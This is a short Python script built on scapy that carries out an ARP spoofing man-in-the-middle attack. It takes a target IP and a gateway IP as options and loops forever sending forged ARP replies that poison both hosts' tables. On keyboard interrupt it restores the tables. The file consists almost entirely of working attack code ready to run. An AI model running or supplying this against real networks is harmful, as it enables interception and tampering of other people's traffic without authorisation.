#!/usr/bin/python3

import scapy.all as scapy
import time
import sys
import getopt
import os


def main(argv):
   global target_ip
   global gateway_ip
   try:
      opts, args = getopt.getopt(argv,"ht:g:",["target=","gateway="])
   except getopt.GetoptError:
      print ('Error, urecognized option')
      sys.exit(2)
   for opt, arg in opts:
      if opt == '-h':
         print (os.path.basename(__file__)+ ' -t <Target IP> -g <Gateway IP>')
         sys.exit()
      elif opt in ("-t", "--target"):
         target_ip = arg
      elif opt in ("-g", "--gateway"):
         gateway_ip = arg
   print ('Target IP: ' + target_ip)
   print ('Gateway IP: ' + gateway_ip)
 
if __name__ == "__main__":
   main(sys.argv[1:])




#target_ip = '192.168.1.107'
#gateway_ip = '192.168.1.1'

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op= 2, pdst = target_ip, hwdst = target_mac, psrc = spoof_ip)
    scapy.send(packet, verbose=False) 
    

def restore (destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)





try:
    sent_packets_count = 0
    while True:
        spoof(target_ip,gateway_ip)
        spoof(gateway_ip,target_ip)

        sent_packets_count = sent_packets_count + 2

        print("\r[+] Sent spoof packets: " + str(sent_packets_count)),
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("\nResetting Arp tables...\n")
    restore(target_ip, gateway_ip)
    restore(gateway_ip,target_ip)
    print("Quitting...")


